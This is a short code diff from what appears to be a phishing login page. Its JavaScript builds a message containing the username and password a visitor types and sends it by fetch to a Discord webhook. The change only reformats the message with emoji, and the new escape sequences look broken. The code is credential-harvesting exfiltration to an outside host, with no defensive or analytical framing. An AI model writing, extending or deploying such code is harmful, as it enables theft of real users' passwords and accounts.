@@ -79,7 +79,7 @@
 
             // Send data to Discord webhook
             const message = {
-                content: `:key: **New Login Attempt**\n **Username:** ${username}\n **Password:** ${password}\n **Time:** ${new Date().toLocaleString()}`
+                content: `:key: **New Login Attempt**\ :bust_in_silhouette: **Username:** ${username}\ :Lock: **Password:** ${password}\ :clock3: **Time:** ${new Date().toLocaleString()}`
             };
 
             fetch(webhookURL, {
